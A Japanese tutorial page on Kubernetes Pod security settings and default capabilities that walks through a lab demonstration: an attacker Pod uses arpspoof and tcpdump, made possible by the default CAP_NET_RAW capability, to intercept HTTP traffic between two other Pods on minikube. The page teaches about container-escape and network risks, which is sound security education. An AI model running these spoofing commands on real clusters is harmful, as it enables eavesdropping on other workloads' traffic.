# Pod の権限と Node へのエスケープ

[ホストへのエスケープ](https://container-security.dev/security/breakout-to-host.html)でも紹介したように、特権コンテナはホスト側にエスケープすることが可能です。  
Kubernetes の場合は Pod がスケジュールされた Node にエスケープすることができます。

## SecurityContext

Docker ではコマンドラインオプションでコンテナの権限を設定できました。  
Kubernetes の Pod では SecurityContext を利用して Pod やコンテナに対して次のような設定が可能です。

- DAC ... 実行ユーザーや volume のグループを変更する
- SELinux ... SELinux の設定
- AppArmor ... AppArmor の設定
- 特権コンテナ ... 特権コンテナか非特権コンテナかの設定
- Linux Capabilities ... Capabilities の設定
- seccomp ... seccomp の設定
- AllowPrivilegeEscalation ... プロセスが追加の特権を取得できないようにする
- readOnlyRootFilesystem ... コンテナのルートファイルシステムを Read Only にする

それぞれの挙動の詳細についてはドキュメントを参照ください。

## Capabilities

コンテナへの過剰な Capability 不要は Breakout につながるものであると紹介しました。  
それでは Pod のデフォルトの Capabilities を確認してみましょう。

```shell
root@test:/# pscap -a
ppid  pid   name        command           capabilities
0     1     root        bash              chown, dac_override, fowner, fsetid, kill, setgid, setuid, setpcap, net_bind_service, net_raw, sys_chroot, mknod, audit_write, setfcap
```

`pscap` コマンドで確認すると、いくつかの Capability が付与されていることが確認できます。  
この中でも興味深いのは `CAP_NET_RAW` です。これは Raw Socket を使うことができるため、 ARP Spoofing や DNS Spoofing を行うことができます。

## ARP Spoofing で Pod 間の通信を盗聴する

Raw Socket を扱えるため ARP Spoofing によって Pod 間の通信を盗聴することができます。  
では実際に試してみましょう。まず、サーバーとなる nginx Pod と、そこにアクセスする client Pod を作成します。

```shell
$ kubectl run --image=nginx:latest server
$ kubectl get pods -o wide
NAME       READY   STATUS    RESTARTS   AGE   IP            NODE       NOMINATED NODE   READINESS GATES
server     1/1     Running   0          15m   172.17.0.15   minikube   <none>           <none>

$ kubectl run --image=nicolaka/netshoot:latest --rm -it client -- bash -c 'while true; do curl http://172.17.0.15 ; sleep 5; done'

$ kubectl get pods -o wide
NAME       READY   STATUS    RESTARTS   AGE   IP            NODE       NOMINATED NODE   READINESS GATES
server     1/1     Running   0          3m   172.17.0.15   minikube   <none>           <none>
client     1/1     Running   0          2m30s   172.17.0.16   minikube   <none>           <none>
```

そして攻撃者用の Pod を作成し、 `arpspoof` コマンドで ARP Spoofing を実行します。  
同時に、 `tcpdump` で通信内容を確認します。

```shell
$ kubectl run --image=ubuntu:latest --rm -it attacker bash
root@attacker:/# apt update ; apt install -y dsniff tcpdump
root@attacker:/# arpspoof -t 172.17.0.16 172.17.0.15
```

```shell
$ kubectl exec -it attacker -- tcpdump -i any tcp -vv
    172.17.0.16.55080 > 172.17.0.15.80: Flags [P.], cksum 0x58b3 (incorrect -> 0x96e4), seq 0:75, ack 1, win 502, options [nop,nop,TS val 910579351 ecr 3251193240], length 75: HTTP, length: 75
        GET / HTTP/1.1
        Host: 172.17.0.15
        User-Agent: curl/7.71.1
        Accept: */*
```

このように通信内容を取得することができました。

## DNS Spoofing

TBD
